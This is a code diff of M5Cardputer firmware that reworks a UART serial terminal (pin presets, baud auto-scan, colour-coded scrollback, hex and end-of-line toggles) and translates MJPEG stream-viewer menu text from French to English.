 static uint32_t burstStartMs  = 0;
 static uint32_t burstCount    = 0;
@@ -24165,9 +24527,8 @@ void drainUART() {
     if (avail <= 0) break;
     if (avail > (int)sizeof(buf)) avail = sizeof(buf);
     int got = uartAuto.readBytes(buf, avail);  // ne bloque pas car avail>0
-    for (int i = 0; i < got; ++i) {
-      pushChar(buf[i]);
-    }
+    ut_rxBytes += got;
+    for (int i = 0; i < got; ++i) pushChar(buf[i]);
   }
 }
 
@@ -24175,25 +24536,72 @@ void drainUART() {
  *  Rendu complet de la fenêtre (utilisé seulement lors du scroll ou saut)  
  * -------------------------------------------------------------------------- */
 void renderScreen() {
-  M5Cardputer.Display.clear();
-  M5Cardputer.Display.setTextSize(1);
-  M5Cardputer.Display.setTextColor(WHITE, BLACK);
-  M5Cardputer.Display.setCursor(0, 0);
+  const int W = M5Cardputer.Display.width();
+  const int H = M5Cardputer.Display.height();
+  LovyanGFX* d;
+  if (ut_cv) { ut_cv->fillSprite(BLACK); d = ut_cv; }
+  else       { M5Cardputer.Display.fillScreen(BLACK); d = &M5Cardputer.Display; }
+  d->setTextSize(1);
+  d->setTextWrap(false, false);   // pas de wrap: les lignes trop longues sont tronquees au bord droit, plus d'overlap sur l'entete
 
-  int maxTop = max(0, static_cast<int>(logBuf.size()) - screenRows);
-  viewTop    = constrain(viewTop, 0, maxTop);
+  // ---- Header ----
+  d->fillRect(0, 0, W, 12, d->color565(40, 48, 61));
+  d->setTextColor(d->color565(180, 200, 255), d->color565(40, 48, 61));
+  d->setCursor(2, 2);
+  if (ut_txPin < 0) d->printf("UART RX%d @%d", ut_rxPin, autoBaud);
+  else              d->printf("UART RX%d TX%d @%d", ut_rxPin, ut_txPin, autoBaud);
+  char rinfo[44];
+  snprintf(rinfo, sizeof(rinfo), "R%lu T%lu %s%s%s",
+           (unsigned long)ut_rxBytes, (unsigned long)ut_txBytes,
+           UT_EOL_NAME[ut_eol], ut_hex ? " HEX" : "", ut_pause ? " II" : "");
+  int rw = (int)strlen(rinfo) * 6;
+  d->setCursor(W - rw - 2, 2);
+  d->print(rinfo);
 
-  for (int row = 0; row < screenRows; ++row) {
-    int idx = viewTop + row;
-    if (idx < (int)logBuf.size())
-      M5Cardputer.Display.println(logBuf[idx]);
-    else if (idx == (int)logBuf.size())
-      M5Cardputer.Display.println(curLine);
-    else
-      M5Cardputer.Display.println();
+  // ---- Scrollback (RX vert, TX cyan, SYS gris) ----
+  const int lineH = 10, top0 = 14, footH = 10, inpH = 12;
+  int rows = (H - top0 - footH - inpH) / lineH;
+  if (rows < 1) rows = 1;
+  screenRows = rows;                       // source unique pour la logique de scroll
+  int extra = curLine.length() ? 1 : 0;
+  int total = (int)logBuf.size() + extra;
+  int maxTop = max(0, total - rows);
+  if (followEnd) viewTop = maxTop;
+  viewTop = constrain(viewTop, 0, maxTop);
+  for (int r = 0; r < rows; ++r) {
+    int idx = viewTop + r;
+    if (idx >= total) break;
+    int y = top0 + r * lineH;
+    const char* line; uint8_t kind;
+    if (idx < (int)logBuf.size()) {
+      const String& L = logBuf[idx];
+      kind = L.length() ? (uint8_t)L[0] : 1;      // octet de tete = couleur
+      line = L.c_str() + (L.length() ? 1 : 0);    // texte decale de 1
+    } else { kind = 1; line = curLine.c_str(); }  // ligne RX en cours (pas de prefixe)
+    uint16_t col = (kind == 2) ? d->color565(90, 200, 255)   // TX cyan
+                 : (kind == 3) ? d->color565(150, 150, 150)  // SYS gris
+                               : d->color565(120, 230, 120);  // RX vert
+    d->setTextColor(col, BLACK);
+    d->setCursor(2, y);
+    d->print(line);
   }
-  M5Cardputer.Display.display();    // flush immédiat pour un redraw total
-  screenDirty = false;              // écran propre
+
+  // ---- Ligne de saisie ----
+  int iy = H - footH - inpH + 1;
+  d->fillRect(0, iy - 1, W, inpH, d->color565(20, 24, 30));
+  d->setTextColor(ut_txPin < 0 ? d->color565(120, 120, 120) : (uint16_t)WHITE, d->color565(20, 24, 30));
+  d->setCursor(2, iy + 1);
+  if (ut_txPin < 0) d->print("[RX only - pas de TX]");
+  else { d->print("> "); d->print(ut_input); }
+
+  // ---- Footer ----
+  d->setTextColor(d->color565(150, 150, 150), (uint16_t)BLACK);
+  d->setCursor(2, H - footH + 1);
+  d->print("ENTER=send Fn;/.=scroll `=quit Fn+h/e/p/c");
+
+  if (ut_cv) ut_cv->pushSprite(0, 0);
+  else       M5Cardputer.Display.display();
+  screenDirty = false;
   nextFlushMs = millis() + FLUSH_INTERVAL_MS;
 }
 
@@ -24220,125 +24628,144 @@ inline void fastPrint(const String& s) { fastPrintNoFlush(s); }
 /* --------------------------------------------------------------------------
  * pushChar : collecte + affichage optionnel
  * -------------------------------------------------------------------------- */
+// kind: 1=RX 2=TX 3=SYS, stocke en octet de tete (non nul) de la String -> pas de conteneur parallele.
+// non-static : evite le prototype 'static extern "C"' casse genere par arduino-cli.
+inline void ut_pushLine(const String& s, uint8_t kind) {
+  String line; line.reserve(s.length() + 1);
+  line += (char)(kind ? kind : 1); line += s;
+  logBuf.push_back(line);
+  if ((int)logBuf.size() > MAX_LINES) logBuf.pop_front();
+}
+
+// RX only : accumule dans curLine, tague RX, gere HEX. Rendu = full sprite (markDirty).
 void pushChar(uint8_t c) {
-  if (c == '\r') return;                          // ignore CR
-
-#ifdef AUTOSHELL_BURST_FREEZE
-  // Détection rafale
-  uint32_t now = millis();
-  if (burstCount == 0) burstStartMs = now;
-  ++burstCount;
-  if (now - burstStartMs > BURST_MS) {
-    burstCount = 1;            // restart fenêtre
-    burstStartMs = now;
-  } else if (burstCount > BURST_THRESH && followEnd) {
-    followEnd = false;         // freeze scroll auto
-  }
-#endif
-
-  if (c == '\n') {
-    logBuf.push_back(curLine);
-    if ((int)logBuf.size() > MAX_LINES) logBuf.pop_front();
-    curLine = String();
-
-    if (followEnd) {
-      fastPrintNoFlush("\n");                    // affichage différé
-      viewTop = max(0, (int)logBuf.size() - screenRows);
-    }
+  if (ut_hex) {
+    char b[4]; sprintf(b, "%02X ", c);
+    curLine += b;
+    if (curLine.length() >= 48) { ut_pushLine(curLine, 1); curLine = String(); }
+    markDirty();
     return;
   }
-
-  /* ---------- caractères imprimables / balise <XX> ---------- */
-  String toPrint;
-  if (c >= 0x20)  { curLine += (char)c; toPrint = (char)c; }
-  else            { char buf[6]; sprintf(buf, "<%02X>", c); curLine += buf; toPrint = buf; }
-
-  if (followEnd) fastPrintNoFlush(toPrint);
-}
-
-
-void drawBaudMenu(int idx) {
-  const int MENU_SZ = NB_BAUD + 1;
-  M5Cardputer.Display.clear();
-  M5Cardputer.Display.setTextSize(1);
-  M5Cardputer.Display.setCursor(0, 0);
-  M5Cardputer.Display.setTextColor(WHITE, BLACK);
-  M5Cardputer.Display.println(F("Choose baudrate :"));
-
-  for (int i = 0; i < MENU_SZ; ++i) {
-    M5Cardputer.Display.print((i == idx) ? F("> ") : F("  "));
-    if (i == 0)   M5Cardputer.Display.println(F("Auto-detect"));
-    else          M5Cardputer.Display.printf("%d bps\n", BAUD_LIST[i - 1]);
+  if (c == '\r') return;
+  if (c == '\n') {
+    ut_pushLine(curLine, 1);
+    curLine = String();
+    markDirty();
+    return;
   }
-  M5Cardputer.Display.display();
-  screenDirty = false;
-  nextFlushMs = millis() + FLUSH_INTERVAL_MS;
+  if (c >= 0x20)  curLine += (char)c;
+  else          { char buf[6]; sprintf(buf, "<%02X>", c); curLine += buf; }
+  markDirty();
 }
 
+
+/* ---------- Menu baud : liste a barre de selection (style uartSelectPins) ----
+ * Entree 0 = Auto-scan, puis BAUD_LIST. Liste fenetree (scroll) pour tenir a l'ecran.
+ * Retour : -1 = Auto-scan choisi, -2 = retour (backtick -> pins), sinon le baud. */
 int selectBaudMenu() {
-  const int MENU_SZ = NB_BAUD + 1;
-  int idx = 0, lastIdx = -1;
+  const int MENU_SZ = NB_BAUD + 1;   // 0 = Auto-scan
+  const int ROWS = 9;                // fenetre visible
+  int idx = 0, top = 0, last = -1, lastTop = -1;
+  enterDebounce();                   // tue l'ENTER qui deborde du menu pins (fix du "saut")
+  bool lastEnter = true;             // edge requis : pas de declenchement immediat
 
   for (;;) {
-    if (idx != lastIdx) { drawBaudMenu(idx); lastIdx = idx; }
-
+    if (idx < top) top = idx;
+    if (idx >= top + ROWS) top = idx - ROWS + 1;
+    if (idx != last || top != lastTop) {
+      M5.Display.clear();
+      M5.Display.setTextSize(1);
+      M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
+      M5.Display.setCursor(4, 3);
+      M5.Display.print("UART Terminal - baud:");
+      for (int r = 0; r < ROWS; r++) {
+        int i = top + r;
+        if (i >= MENU_SZ) break;
+        int y = 16 + r * 12;
+        if (i == idx) {
+          M5.Display.fillRect(0, y - 1, M5.Display.width(), 12, TFT_GREEN);
+          M5.Display.setTextColor(TFT_BLACK, TFT_GREEN);
+        } else {
+          M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+        }
+        M5.Display.setCursor(6, y);
+        if (i == 0) M5.Display.print("Auto-scan");
+        else        M5.Display.printf("%d bps", BAUD_LIST[i - 1]);
+      }
+      M5.Display.setTextColor(TFT_DARKGREY, TFT_BLACK);
+      M5.Display.setCursor(4, 16 + ROWS * 12 + 2);
+      M5.Display.print(";/.=bouger ENT=ok `=pins");
+      M5.Display.display();
+      last = idx; lastTop = top;
+    }
     cardUpdate();
-    auto ks = M5Cardputer.Keyboard.keysState();
-
-    if (ks.enter)                      return (idx == 0) ? -1 : BAUD_LIST[idx - 1];
-    if (kp(';')) { idx = (idx + MENU_SZ - 1) % MENU_SZ; delay(120); }
-    if (kp('.')) { idx = (idx + 1) % MENU_SZ; delay(120); }
-    if (kp('`'))  return -2;
-
-    delay(5);
+    bool enterNow = kp(KEY_ENTER);
+    if (enterNow && !lastEnter) return (idx == 0) ? -1 : BAUD_LIST[idx - 1];
+    lastEnter = enterNow;
+    if (kp(KEY_BACKSPACE) || kp('`')) { keyRelease(); return -2; }   // DEL (ou backtick) = retour aux pins
+    if (kp(';')) { idx = (idx + MENU_SZ - 1) % MENU_SZ; delay(130); }
+    if (kp('.')) { idx = (idx + 1) % MENU_SZ;           delay(130); }
+    delay(6);
   }
 }
 
-/* ---------- Détection + animation ---------- */
+/* ---------- Auto-scan baud : affichage live + controle ---------- */
 int detectBaud() {
-  static const char spin[4] = {'|','/','-','\\'};
-  uint8_t spinIdx = 0;
+  const unsigned long DWELL = 1500;   // ms par baud (vs 5000 avant)
+  for (int i = 0; i < NB_BAUD; i++) {
+    int rate = BAUD_LIST[i];
+    M5.Display.clear();
+    M5.Display.setTextSize(1);
+    M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
+    M5.Display.setCursor(4, 4);
+    M5.Display.printf("Auto-scan  %d/%d", i + 1, NB_BAUD);
+    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+    M5.Display.setTextSize(2);
+    M5.Display.setCursor(6, 26);
+    M5.Display.printf("%d bps", rate);
+    M5.Display.setTextSize(1);
+    M5.Display.setTextColor(TFT_DARKGREY, TFT_BLACK);
+    M5.Display.setCursor(4, 120);
+    M5.Display.print("`=stop  .=suivant");
+    M5.Display.display();
 
-  M5Cardputer.Display.clear();
-  M5Cardputer.Display.setCursor(0, 0);   // <<< corrigeait M5.Display.*
-  M5Cardputer.Display.setTextSize(1);
-  M5Cardputer.Display.setTextColor(WHITE, BLACK);
-  M5Cardputer.Display.print(F("Scanning baud "));
-  int spinX = M5Cardputer.Display.getCursorX();
-  int spinY = M5Cardputer.Display.getCursorY();
-  M5Cardputer.Display.display();
-
-  for (int rate : BAUD_LIST) {
-    M5Cardputer.Display.setCursor(spinX, spinY);
-    M5Cardputer.Display.print(spin[spinIdx++ & 3]);
-    M5Cardputer.Display.display();
-    cardUpdate();
-    if (M5.getBoard() == m5::board_t::board_M5CardputerADV) {
-      uartAuto.begin(rate, SERIAL_8N1, 13, 15);
-      Serial.println("Detected: Cardputer-ADV");
-    } else if (M5.getBoard() == m5::board_t::board_M5Cardputer) {
-      uartAuto.begin(rate, SERIAL_8N1, 1, 2);
-      Serial.println("Detected: Cardputer");
-    } 
+    uartAuto.begin(rate, SERIAL_8N1, ut_rxPin, ut_txPin);
     unsigned long t0 = millis();
-    int total = 0, printable = 0;
-    while (millis() - t0 < 5000) {
-      if (uartAuto.available()) {
-        char c = uartAuto.read();
-        total++;
+    int total = 0, printable = 0, lastShown = -1;
+    bool found = false, skip = false, cancel = false;
+
+    while (millis() - t0 < DWELL) {
+      while (uartAuto.available()) {
+        char c = uartAuto.read(); total++;
         if (isprint((uint8_t)c) || c == '\r' || c == '\n') printable++;
       }
+      if (total != lastShown) {       // compteur rx / printable live
+        M5.Display.fillRect(0, 60, M5.Display.width(), 16, TFT_BLACK);
+        M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+        M5.Display.setCursor(6, 62);
+        M5.Display.printf("rx:%d  ok:%d%%", total, total ? (printable * 100 / total) : 0);
+        M5.Display.display();
+        lastShown = total;
+      }
+      if (total > 30 && printable * 100 / total > 60) { found = true; break; }
+      cardUpdate();                   // lire le clavier PENDANT l'attente
+      if (kp(KEY_BACKSPACE) || kp('`')) { { keyRelease(); cancel = true; break; } }   // DEL (ou backtick) = annule le scan
+      if (kp('.') || kp(' ')) { skip = true; break; }
+      delay(4);
     }
     uartAuto.end();
 
-    if (total > 30 && printable * 100 / total > 60) {
-      M5Cardputer.Display.setCursor(spinX, spinY); M5Cardputer.Display.print(' ');
-      M5Cardputer.Display.setCursor(0, 10);
-      M5Cardputer.Display.printf("\u2192 %d bps", rate); // flèche → Unicode (peut être ignorée si police non supportée)
-      M5Cardputer.Display.display();
-      delay(400);
+    if (cancel) return -2;            // annulation -> retour menu baud
+    if (found) {
+      M5.Display.fillRect(0, 88, M5.Display.width(), 20, TFT_BLACK);
+      M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
+      M5.Display.setCursor(6, 90);
+      M5.Display.printf("-> %d bps", rate);
+      M5.Display.display();
+      delay(500);
       return rate;
     }
+    if (skip) { while (kp('.') || kp(' ')) { cardUpdate(); delay(10); } } // relache avant suivant
   }
   return -1;
 }
@@ -24346,150 +24773,206 @@ int detectBaud() {
 /* --------------------------------------------------------------------------
  *  Boucle interactive du shell UART (tampon circulaire, scroll Fn+;/. )
  * -------------------------------------------------------------------------- */
+/* --------------------------------------------------------------------------
+ *  Terminal UART : sélection des pins GPIO (RX / TX) avant ouverture
+ * -------------------------------------------------------------------------- */
+String promptInput(const char *prompt);   // fwd decl (défini plus bas)
+
+bool uartSelectPins() {
+  struct UPreset { const char* name; int rx; int tx; };
+  // rx == -2 => saisie RX + TX ; rx == -3 => saisie RX, TX forcé -1 (RX only)
+  static const UPreset UP[] = {
+    { "Grove   RX1  TX2",   1,  2 },
+    { "EXT-ADV RX13 TX15", 13, 15 },
+    { "Custom  (RX + TX)",  -2, -2 },
+    { "RX only (RX seul)",  -3, -3 },
+  };
+  const int N = (int)(sizeof(UP) / sizeof(UP[0]));
+  int idx  = (M5.getBoard() == m5::board_t::board_M5CardputerADV) ? 1 : 0;
+  int last = -1;
+
+  for (;;) {
+    if (idx != last) {
+      M5.Display.clear();
+      M5.Display.setTextSize(1);
+      M5.Display.setTextColor(TFT_GREEN, TFT_BLACK);
+      M5.Display.setCursor(4, 4);
+      M5.Display.println("UART Terminal - pins:");
+      for (int i = 0; i < N; i++) {
+        int y = 24 + i * 16;
+        if (i == idx) {
+          M5.Display.fillRect(0, y - 2, M5.Display.width(), 14, TFT_GREEN);
+          M5.Display.setTextColor(TFT_BLACK, TFT_GREEN);
+        } else {
+          M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+        }
+        M5.Display.setCursor(6, y);
+        M5.Display.print(UP[i].name);
+      }
+      M5.Display.setTextColor(TFT_DARKGREY, TFT_BLACK);
+      M5.Display.setCursor(4, 24 + N * 16 + 6);
+      M5.Display.print(";/.=bouger ENT=ok `=retour");
+      M5.Display.display();
+      last = idx;
+    }
+    cardUpdate();
+    if (kp(KEY_BACKSPACE) || kp('`')) { keyRelease(); return false; }   // DEL (ou backtick) = retour (sortie du shell UART)
+    if (kp(KEY_ENTER)) {
+      const UPreset& p = UP[idx];
+      if (p.rx == -2) {
+        String r = promptInput("RX GPIO >");
+        String t = promptInput("TX GPIO >");
+        ut_rxPin = r.toInt(); ut_txPin = t.toInt();
+      } else if (p.rx == -3) {
+        String r = promptInput("RX GPIO >");
+        ut_rxPin = r.toInt(); ut_txPin = -1;
+      } else {
+        ut_rxPin = p.rx; ut_txPin = p.tx;
+      }
+      return true;
+    }
+    if (kp(';')) { idx = (idx + N - 1) % N; delay(140); }
+    if (kp('.')) { idx = (idx + 1) % N;     delay(140); }
+    delay(8);
+  }
+}
+
 void startUARTShell() {
   inMenu = false;
   enterDebounce();
 
-  /* ---------- Sélection / détection du baudrate ---------- */
-  int sel = selectBaudMenu();
-  if (sel == -2) { waitAndReturnToMenu("Canceled"); return; }
-  autoBaud = (sel == -1) ? detectBaud() : sel;
+  /* ---------- 1) pins -> baud -> terminal (backtick = retour d'un cran) ---------- */
+  bool gotBaud = false;
+  while (!gotBaud) {
+    if (!uartSelectPins()) { waitAndReturnToMenu("Canceled"); return; }  // backtick aux pins = sortie
+    bool backToPins = false;
+    while (!gotBaud && !backToPins) {
+      int sel = selectBaudMenu();            // -2 = retour aux pins
+      if (sel == -2) { backToPins = true; break; }
+      enterDebounce();
+      if (sel == -1) {                       // Auto-scan
+        int d = detectBaud();                // -2 annule, -1 rien trouve -> re-menu baud
+        if (d == -2) continue;
+        if (d == -1) {
+          M5.Display.clear();
+          M5.Display.setTextSize(1);
+          M5.Display.setTextColor(TFT_RED, TFT_BLACK);
+          M5.Display.setCursor(4, 50);
+          M5.Display.print("No baud detected");
+          M5.Display.display();
+          delay(900);
+          continue;
+        }
+        autoBaud = d; gotBaud = true;
+      } else {
+        autoBaud = sel; gotBaud = true;
+      }
+    }
+  }
   if (autoBaud <= 0) autoBaud = 115200;
 
-  /* ---------- Initialisation UART ---------- */
+  /* ---------- 3) Initialisation UART (pins choisis) ---------- */
   uartShellRun = true;
   cardgps.end();
-  uartAuto.setRxBufferSize(UART_RX_BUF);                    // PATCH: agrandir tampon RX
-  if (M5.getBoard() == m5::board_t::board_M5CardputerADV) {
-    uartAuto.begin(autoBaud, SERIAL_8N1, 13, 15);
-    Serial.println("Detected: Cardputer-ADV");
-  } else if (M5.getBoard() == m5::board_t::board_M5Cardputer) {
-    uartAuto.begin(autoBaud, SERIAL_8N1, 1, 2);
-    Serial.println("Detected: Cardputer");
-  } else {
-    uartAuto.begin(autoBaud, SERIAL_8N1, 1, 2);
-    Serial.println("Unknown board type");
-  }
-  /* ---------- Hauteur glyph + lignes visibles ---------- */
-  M5Cardputer.Display.setTextSize(1);                 // police « Small »
-  #if defined(M5GFX_VERSION)
-    glyphH = M5Cardputer.Display.fontHeight();          // API récente
-  #else
-    glyphH = 8;                                        // valeur par défaut
-  #endif
-  screenRows = M5Cardputer.Display.height() / glyphH;
+  uartAuto.setRxBufferSize(UART_RX_BUF);                    // tampon RX large
+  uartAuto.begin(autoBaud, SERIAL_8N1, ut_rxPin, ut_txPin);
 
-  /* ---------- Reset tampon + bandeau ---------- */
-  logBuf.clear();  curLine = "";
-  viewTop = 0;  followEnd = true;
+  /* ---------- 4) Sprite double-buffer (alloc runtime : 0 RAM au boot) ---------- */
+  const int W = M5Cardputer.Display.width();
+  const int H = M5Cardputer.Display.height();
+  ut_cv = new (std::nothrow) M5Canvas(&M5Cardputer.Display);
+  if (ut_cv) { ut_cv->setColorDepth(8); if (!ut_cv->createSprite(W, H)) { delete ut_cv; ut_cv = nullptr; } }  // 8bpp = 32Ko -> s'alloue sans PSRAM -> double-buffer OK -> pas de flicker (16bpp echouait)
+  M5Cardputer.Display.setTextSize(1);
+  glyphH = 10;
 
-  logBuf.push_back(String("AutoShell @") + autoBaud + F(" bps  (` to quit)`"));
-  curLine = "> ";
-  renderScreen();
-
-  /* ---------- Variables session ---------- */
-  std::string cmd;
-  bool lastEnter = false, lastBack = false;
-  bool lastScrollUp = false, lastScrollDn = false;
-
+  /* ---------- 5) Reset état session ---------- */
+  logBuf.clear();
+  curLine = ""; ut_input = "";
+  ut_rxBytes = 0; ut_txBytes = 0;
+  viewTop = 0; followEnd = true;
+  ut_pushLine(String("UART @") + autoBaud + " bps  RX" + ut_rxPin +
+              (ut_txPin < 0 ? String("  (RX only)") : String("  TX") + ut_txPin), 3);
+  ut_pushLine("Fn+;/.=scroll  Fn+h=hex e=eol p=pause c=clear  `=quit", 3);
+  markDirty();
   nextFlushMs = millis();
-  screenDirty = false;
+  screenDirty = true;
 
-#ifdef AUTOSHELL_BURST_FREEZE
-  burstCount = 0; burstStartMs = 0;
-#endif
+  bool lastEnter = false, lastBack = false, lastUp = false, lastDn = false;
+  bool lastH = false, lastE = false, lastP = false, lastC = false;
 
   /* ================== Boucle principale ================== */
   while (uartShellRun) {
-    // 1) Lire en priorité le flux UART pour éviter overflow
     drainUART();
-
-    // 2) Mise à jour M5 / clavier
     cardUpdate();
 
-    /* ----- sortie immédiate avec ` ----- */
-    if (kp('`')) break;
+    if (kp('`')) { keyRelease(); break; }
 
-    /* ----- état clavier ----- */
+    bool fnNow    = kp(KEY_FN);
     bool enterNow = kp(KEY_ENTER);
     bool backNow  = kp(KEY_BACKSPACE);
-    bool fnNow    = kp(KEY_FN);
     bool upNow    = kp(';');
     bool dnNow    = kp('.');
+    bool hNow     = fnNow && kp('h');
+    bool eNow     = fnNow && kp('e');
+    bool pNow     = fnNow && kp('p');
+    bool cNow     = fnNow && kp('c');
 
     /* ---------- Scroll manuel ---------- */
-    if (fnNow && upNow && !lastScrollUp) {
-      followEnd = false;
-      viewTop   = max(0, viewTop - 1);
-      renderScreen();
+    if (fnNow && upNow && !lastUp) { followEnd = false; viewTop = max(0, viewTop - 1); markDirty(); }
+    if (fnNow && dnNow && !lastDn) {
+      int maxTop = max(0, (int)logBuf.size() + (curLine.length() ? 1 : 0) - screenRows);
+      if (viewTop < maxTop) { viewTop++; markDirty(); }
+      else                  { followEnd = true; markDirty(); }
     }
-    if (fnNow && dnNow && !lastScrollDn) {
-      int maxTop = max(0, int(logBuf.size()) - screenRows);
-      if (viewTop < maxTop)  { viewTop++; renderScreen(); }
-      else                   { followEnd = true; renderScreen(); }
-    }
-    lastScrollUp = fnNow && upNow;
-    lastScrollDn = fnNow && dnNow;
+    lastUp = fnNow && upNow; lastDn = fnNow && dnNow;
 
-    /* ---------- ENTRÉE : envoi ligne ---------- */
+    /* ---------- Toggles ---------- */
+    if (hNow && !lastH) { ut_hex   = !ut_hex;          markDirty(); } lastH = hNow;
+    if (eNow && !lastE) { ut_eol   = (ut_eol + 1) & 3; markDirty(); } lastE = eNow;
+    if (pNow && !lastP) { ut_pause = !ut_pause; renderScreen(); } lastP = pNow;  // rend 1x pour afficher l'etat gele (II)
+    if (cNow && !lastC) { logBuf.clear(); curLine = ""; viewTop = 0; followEnd = true; markDirty(); } lastC = cNow;
+
+    /* ---------- ENTRÉE : envoi TX ---------- */
     if (enterNow && !lastEnter) {
-      for (char ch : cmd) pushChar(ch);
-      pushChar('\n');
-      uartAuto.write(cmd.c_str());
-      uartAuto.write("\r\n");
-      cmd.clear();
-      curLine = "> ";
-      followEnd = true;
-    }
-
-    /* ---------- BACKSPACE ---------- */
-    if (backNow && !lastBack && !cmd.empty()) {
-      cmd.pop_back();
-      if (!curLine.isEmpty())
-        curLine.remove(curLine.length() - 1, 1);
-
-      if (followEnd) {
-        M5Cardputer.Display.print("\b \b");
-        markDirty();
-      } else {
-        renderScreen();
-      }
-    }
-    lastBack = backNow;
-
-    /* ---------- Saisie caractères ---------- */
-    if (M5Cardputer.Keyboard.isChange() && kpAny()) {
-      auto ks = M5Cardputer.Keyboard.keysState();
-      for (auto c : ks.word) {
-        if ((fnNow && (c == ';' || c == '.')) || c == '`') continue;
-
-        cmd.push_back(c);
-        curLine += char(c);
-
-        if (followEnd) {
-          M5Cardputer.Display.write(c);
-          markDirty();
-        } else {
-          renderScreen();
-        }
+      if (ut_txPin >= 0 && ut_input.length()) {
+        uartAuto.write((const uint8_t*)ut_input.c_str(), ut_input.length());
+        const char* eol = UT_EOL_SEQ[ut_eol];
+        size_t eolLen = strlen(eol);
+        if (eolLen) uartAuto.write((const uint8_t*)eol, eolLen);
+        ut_txBytes += ut_input.length() + eolLen;
+        ut_pushLine(String("> ") + ut_input, 2);
+        ut_input = ""; followEnd = true; markDirty();
       }
     }
     lastEnter = enterNow;
 
-    /* ---------- UART entrant (drain complémentaire) ---------- */
+    /* ---------- BACKSPACE ---------- */
+    if (backNow && !lastBack) {
+      if (ut_txPin >= 0 && ut_input.length()) { ut_input.remove(ut_input.length() - 1); markDirty(); }
+    }
+    lastBack = backNow;
+
+    /* ---------- Saisie caractères ---------- */
+    if (ut_txPin >= 0 && !fnNow && M5Cardputer.Keyboard.isChange() && kpAny()) {
+      auto ks = M5Cardputer.Keyboard.keysState();
+      for (auto c : ks.word) {
+        if (c == '`') continue;
+        ut_input += (char)c;
+      }
+      markDirty();
+    }
+
+    /* ---------- Drain complémentaire + flush ---------- */
     drainUART();
-
-    // 3) Flush écran si nécessaire
-    flushDisplayIfNeeded();
-
+    if (!ut_pause && screenDirty && (int32_t)(millis() - nextFlushMs) >= 0) {
+      renderScreen();   // gère screenDirty=false + nextFlushMs
+    }
     delay(1);
   }
 
   /* ---------- Fin de session ---------- */
-  if (!curLine.isEmpty()) logBuf.push_back(curLine);
-  renderScreen();
-
   uartAuto.end();
+  if (ut_cv) { ut_cv->deleteSprite(); delete ut_cv; ut_cv = nullptr; }
   cardgps.begin(baudrate_gps, SERIAL_8N1, gpsRxPin, gpsTxPin);
   uartShellRun = false;
   waitAndReturnToMenu("Back to menu");
@@ -24571,16 +25054,16 @@ String promptInput(const char *prompt) {
       auto k = M5Cardputer.Keyboard.keysState();
       for (char c : k.word) if (isPrintable(c)) input += c;
       if (k.del && input.length()) input.remove(input.length() - 1);
-      if (k.enter && input.length()) return input;
+      if (k.enter) { enterDebounce(); return input; }   // ENTER valide meme vide (+ attend relache -> le loop appelant ne re-ouvre pas la saisie)
       piDirty = true;
     }
     // ── Web virtual keyboard ──
-    if (navPendingAction == NAV_ENTER) { navPendingAction = NAV_NONE; if (input.length()) return input; }
+    if (navPendingAction == NAV_ENTER) { navPendingAction = NAV_NONE; return input; }   // ENTER valide meme vide
     else if (navPendingAction == NAV_BACK) { navPendingAction = NAV_NONE; if (input.length()) { input.remove(input.length() - 1); piDirty = true; } }
     if (navPendingCharValid) {
       uint8_t c = navPendingChar; navPendingCharValid = false; navPendingChar = 0;
       if (c == KEY_BACKSPACE) { if (input.length()) input.remove(input.length() - 1); }
-      else if (c == KEY_ENTER) { if (input.length()) return input; }
+      else if (c == KEY_ENTER) { return input; }   // ENTER valide meme vide
       else if (c >= 32 && c < 127) input += (char)c;
       piDirty = true;
     }
@@ -27017,13 +27500,13 @@ String buildUrl(const StreamItem& s, const char* res, int comp) {
 void menuDrawStatic() {
   M5.Display.fillScreen(TFT_BLACK);
   uiText(2, 2, "MJPEG Viewer - MENU", TFT_CYAN);
-  uiText(2, 58, "ENTER: Lancer   LEFT/RIGHT: Flux", TFT_YELLOW);
+  uiText(2, 58, "ENTER: Launch   LEFT/RIGHT: Stream", TFT_YELLOW);
   uiText(2, 70, "R: Res  UP/DOWN: Comp  BACKSPACE: Retour", TFT_YELLOW);
 }
 void menuDrawFields(int streamIdx, int resIdx, int comp) {
   M5.Display.fillRect(0, 18, SCREEN_W, 36, TFT_BLACK);
-  uiPrintf(2, 18, TFT_WHITE, "Flux:  [%d/%d] %s", streamIdx + 1, streamCount(), g_streams[streamIdx].name.c_str());
-  uiPrintf(2, 30, TFT_WHITE, "Res.:  %s  (touche R)", RES_LIST[resIdx]);
+  uiPrintf(2, 18, TFT_WHITE, "Stream:  [%d/%d] %s", streamIdx + 1, streamCount(), g_streams[streamIdx].name.c_str());
+  uiPrintf(2, 30, TFT_WHITE, "Res.:  %s  (R key)", RES_LIST[resIdx]);
   uiPrintf(2, 42, TFT_WHITE, "Comp.: %d  (UP/DOWN)", comp);
 }
 
@@ -27038,12 +27521,12 @@ bool runMenu() {
   if (streamCount() == 0) {
     M5.Display.fillScreen(TFT_BLACK);
     uiText(2, 2, "MJPEG Viewer - MENU", TFT_CYAN);
-    uiText(2, 18, "Aucun flux. Verifie SD:/evil/CCTV/CCTV_live.txt", TFT_RED);
+    uiText(2, 18, "No stream. Check SD:/evil/CCTV/CCTV_live.txt", TFT_RED);
     uiText(2, 30, "BACKSPACE: Retour / ` : Quit", TFT_YELLOW);
     while (true) {
       M5.update(); cardUpdate();
       if (kp(KEY_BACKSPACE)) return false;
-      if (kp('`')) return false;
+      if (kp('`')) { keyRelease(); return false; }
       delay(20);
     }
   }
@@ -27093,7 +27576,7 @@ bool runMenu() {
     // sorties
     if (kp(KEY_ENTER))     return true;   // lancer viewer
     if (kp(KEY_BACKSPACE)) return false;  // retour parent
-    if (kp('`'))           return false;  // retour parent
+    if (kp('`'))           { keyRelease(); return false; }  // retour parent
 
     delay(8);
   }
@@ -27124,7 +27607,7 @@ static bool mjpegViewerFS_impl(const char* url, fs::FS& fs, const char* pathA, c
 
     // statut discret sous la barre
     M5.Display.fillRect(0, TOPBAR_H, SCREEN_W, 10, TFT_BLACK);
-    uiText(2, TOPBAR_H, "Connexion flux...", TFT_WHITE);
+    uiText(2, TOPBAR_H, "Stream connect...", TFT_WHITE);
 
     // ---- TCP connect ----
     uint32_t ready_deadline = millis() + STREAM_READY_TIMEOUT_MS;
